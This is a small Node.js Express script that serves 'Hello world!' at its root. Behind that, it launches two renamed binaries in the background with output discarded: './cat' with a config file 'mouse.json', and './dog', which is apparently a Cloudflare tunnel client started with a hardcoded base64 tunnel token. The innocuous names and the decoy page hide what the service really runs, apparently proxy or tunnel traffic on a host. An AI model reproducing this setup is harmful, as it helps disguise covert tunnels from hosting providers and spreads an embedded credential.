const express = require("express");
const app = express();
const { exec, execSync } = require('child_process');
const port = process.env.SERVER_PORT || process.env.PORT || 3000;        
const ARGO_AUTH = process.env.ARGO_AUTH || 'eyJhIjoiMmY1YjMwYjRjNzEwNmZlMTg0ZTIwN2U4ZTA5ZTcxZmUiLCJ0IjoiOGM1MzI1MDUtNGM3NS00NDQxLWE0MzQtNmQzYThhYzU0MDRjIiwicyI6IlpqWTRaamc1WkRZdFltSm1NUzAwTTJGa0xXSmxOakl0TkdFMllqZzVOelpsTldRMyJ9';


app.get("/", function(req, res) {
  res.send("Hello world!");
});


runWeb();

function runWeb() {
  const command1 = `nohup ./cat -c ./mouse.json >/dev/null 2>&1 &`;
  exec(command1, (error) => {
    if (error) {
      console.error(`web running error: ${error}`);
    } else {
      console.log('web is running');

      setTimeout(() => {
        runServer();
      }, 2000);
    }
  });
}


function runServer() {
  let command2 = `nohup ./dog tunnel --edge-ip-version auto --no-autoupdate --protocol http2 run --token ${ARGO_AUTH} >/dev/null 2>&1 &`;
  
  exec(command2, (error) => {
    if (error) {
      console.error(`server running error: ${error}`);
    } else {
      console.log('server is running');
    }
  });
}

app.listen(port, () => console.log(`Port ${port}!`));
